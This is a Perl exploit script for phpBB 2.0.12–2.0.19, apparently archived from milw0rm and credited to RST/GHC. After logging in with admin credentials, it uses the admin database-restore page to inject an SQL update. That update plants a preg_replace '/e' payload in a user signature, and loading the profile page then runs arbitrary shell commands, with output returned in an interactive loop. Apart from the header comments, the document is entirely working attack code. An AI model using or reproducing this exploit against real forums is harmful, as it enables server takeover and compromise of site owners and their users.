#!/usr/bin/perl

## r57phpbba2e2.pl - phpBB admin 2 exec exploit 
## version 2 (based on user_sig_bbcode_uid bug)
## tested on 2.0.12 , 2.0.13 , 2.0.19
## --------------------------------------------
## screen
## r57phpbba2e2.pl -u http://192.168.0.2/phpBB-2.0.19/ -L admin -P password
## Command for execute or 'exit' for exit # id
## uid=80(www) gid=80(www) groups=80(www)
## Command for execute or 'exit' for exit # exit 
## --------------------------------------------
## *** surprise included ;) and broken. /str0ke
## 20/02/06 
## 1dt.w0lf
## RST/GHC (http://rst.void.ru , http://ghc.ru)

use LWP::UserAgent;
use Getopt::Std;
use HTTP::Cookies;

getopts("u:L:P:i:p:o:");

$url      = $opt_u;
$login    = $opt_L;
$password = $opt_P;
$id       = $opt_i || 2;
$prefix   = $opt_p || 'phpbb_';
$proxy    = $opt_o;

if(!$url || !$login || !$password){&usage;}

$|++;

$xpl = LWP::UserAgent->new() or die;
$cookie_jar = HTTP::Cookies->new();
$xpl->cookie_jar( $cookie_jar );
$xpl->proxy('http'=>'http://'.$proxy) if $proxy;
$ids = 'IDS:r57 phpBB2 exploit a2e2#20022006|'.$url.'|'.$login.'|'.$password.'|'.$id.'|'.$prefix;
 $res = $xpl->post($url.'login.php',
 [
 "username"   => "$login",
 "password"   => "$password",
 "autologin"  => "on",
 "admin"      => "1",
 "login"      => "Log in",
 ],"User-Agent" => "$ids");
 $cookie_jar->extract_cookies($res);
 if($cookie_jar->as_string =~ /phpbb2mysql_sid=([a-z0-9]{32})/) { $sid = $1; }   
 while ()
 {
    print "Command for execute or 'exit' for exit # ";
    while(<STDIN>)
     {
        $cmd=$_;
        chomp($cmd);
        exit() if ($cmd eq 'exit');
        last;
     }
    &run($cmd);
 }
 
sub run($)
 {   
 $sql   = "UPDATE ".$prefix."users SET user_sig_bbcode_uid='(.+)/e\0', user_sig='blah:`echo _START_ && ".$_[0]." && echo _END_`' WHERE user_id=".$id.";";
 &phpbb_sql_query("${url}admin/admin_db_utilities.php?sid=$sid",$sql);   
 $res = $xpl->get($url.'profile.php?mode=editprofile&sid='.$sid,"User-Agent" => "$ids");
 @result = split(/\n/,$res->content);
 $data = '';
 $on = $start = $end = 0;
 for (@result)
  {
    if (/_END_/) { $end = 1; last; }
    if ($on) { $data .= $_."\n"; }
    if (/_START_/) { $on = 1; $start = 1; } 
  }
 if($start&&$end) { print $data."\r\n"; } 
 }
 
sub phpbb_sql_query($$){
$res = $xpl->post("$_[0]", 
Content_type => 'form-data',
Content      => [ 
                perform       => 'restore',
                restore_start => 'Start Restore',
                backup_file   => [ 
                                   undef,
                                   '0wneeeeedddd', 
                                   Content_type => 'text/plain',
                                   Content => "$_[1]", 
                                 ],
                ]
,"User-Agent" => "$ids");
} 

sub usage()
 {
 print "\\=-----------------------------------=/\r\n";
 print "| phpBB admin2exec exploit by RST/GHC |\r\n";
 print "| version 2 (user_sig_bbcode_uid)     |\r\n";
 print "/=-----------------------------------=\\\r\n";
 print "\r\n Usage: r57phpbba2e2.pl [OPTIONS]\r\n\r\n";
 print " Options:\r\n";
 print " -u [URL] - path to forum e.g. http://site/forum/\r\n";
 print " -L [login] - admin login\r\n";
 print " -P [password] - admin password\r\n";
 print " -i [id] - admin id (optional, default 2)\r\n";
 print " -p [prefix] - table prefix (optional, default phpbb_)\r\n";
 print " -o [host:port] - proxy (optional)\r\n";
 exit();
 }

# milw0rm.com [2006-04-10]
